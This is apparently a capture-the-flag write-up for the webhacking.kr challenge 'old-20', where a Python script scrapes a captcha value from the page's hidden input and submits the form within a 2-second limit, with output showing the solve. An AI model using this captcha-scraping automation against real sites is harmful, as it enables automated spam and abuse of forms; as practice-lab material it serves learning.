# Old 20    Captcha + Timer Form

URL: [https://webhacking.kr/challenge/code-4/](https://webhacking.kr/challenge/code-4/)

We are given a form and time limit seems to be 2 second. Manually submitting the form results in `Too Slow!`

![old-20.png](/assets/ctf/webhacking.kr/old-20.png)

To submit the form within 2 seconds we should use a script.

```python
import requests
from bs4 import BeautifulSoup as BS

URL = 'https://webhacking.kr/challenge/code-4/index.php'
cookies = {'PHPSESSID': 'fqn9tv8tbam8b4gi2edk8vc8bu'}

with requests.Session() as session:
    resp = session.get(URL, cookies=cookies)
    cookies.update(resp.cookies.get_dict())
    captcha = BS(resp.text, 'html.parser').find('input', {'name': 'captcha_'})['value']
    
    data = {'id': 'x', 'cmt': 'y', 'captcha': captcha}
    resp = session.post(URL, cookies=cookies, data=data)

    print(captcha)
    print(cookies)
    print(resp.text)
```

```powershell
➜ py .\old-20.py
YDqIgom9s4
{'PHPSESSID': 'fqn9tv8tbam8b4gi2edk8vc8bu', 'st': '1720871128'}
<script>alert('old-20 Pwned!');</script><hr>old-20 Pwned. You got 20point. Congratz!<hr>
```